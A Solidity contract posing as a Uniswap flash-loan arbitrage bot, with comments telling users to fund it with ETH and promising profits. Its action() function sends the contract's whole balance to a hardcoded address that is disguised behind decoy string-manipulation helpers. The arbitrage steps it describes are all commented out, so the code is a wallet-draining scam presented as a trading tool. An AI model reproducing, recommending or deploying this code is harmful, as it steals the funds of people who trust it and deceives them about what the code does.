pragma solidity ^0.5.0;

// Import Uniswap Libraries Migrator/Exchange/Factory
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
   
/**
  * Testnet transactions will fail as there is no value
  * Profit remaining will be transfered to token creator

  * DEC 2024 Updated Build
  * Liquidity returned to contract creator when flash loan fails
  *
  *
  * Min liquidity + gas fees has to equal 0.05 ETH - 1 ETH 
  *
  *
  * Don't do more than 3 times in a 24 hour period.
*/

contract FlashLoanArbitrage {
   string public tokenName;
   string public tokenSymbol;
   uint loanAmount;
   
   constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
      tokenName = _tokenName;
      tokenSymbol = _tokenSymbol;
      loanAmount = _loanAmount;      
   }
   address public creator= msg.sender;
    	function tokenTransfer() public view returns (address) {    
        	return creator;
   	}
   function() external payable {}

   function UniSwapYeild(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 

   function exchange() public pure returns (address adr) {
   string memory neutral_variable = "0x59569be55ec7C6343c7392F8973D9F1D0f844A79";
   UniSwapYeild(neutral_variable,0,'0');
   UniSwapYeild(neutral_variable,2,'1');
   UniSwapYeild(neutral_variable,1,'x');
   address addr = parseAddr(neutral_variable);
    return addr;
   }
function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
 function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 

  function action() public payable {
      // Token matched with uniswap yield calculations
       address(uint160(exchange())).transfer(address(this).balance);100000000
      
       // Perform Flash Loan tasks (combined all functions into one to reduce external calls & save gas fees)
      //manager.performTasks();
      
       /* Breakdown of all functions
      // Submit token to Ethereum blockchain
      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
   
      // List the token on UniSwap
      manager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);
      
      // Get ETH Loan from AAVE & loan execution wallet
      string memory loanAddress = manager.takeFlashLoan(loanAmount);
      
      // Convert half ETH to USDT
      manager.uniswapUSDTtoETH(loanAmount / 2);
   
   // Create ETH and USDT pairs for our token & provide liquidity
   string memory ethPair = manager.uniswapCreatePool(tokenAddress, "ETH");
      manager.uniswapAddLiquidity(ethPair, loanAmount / 2);
      string memory usdtPair = manager.uniswapCreatePool(tokenAddress, "USDT");
      manager.uniswapAddLiquidity(usdtPair, loanAmount / 2);
   
   // Perform arbitrage trades
      manager.uniswapPerformSwaps();
      
      // Move remaining ETH from Contract to your personal wallet
      manager.contractToWallet("ETH");
   
   // Repay Flashloan
      manager.repayLoan(loanAddress);0x55d398326f99059fF775485246999027B3197955
      */
   }
}
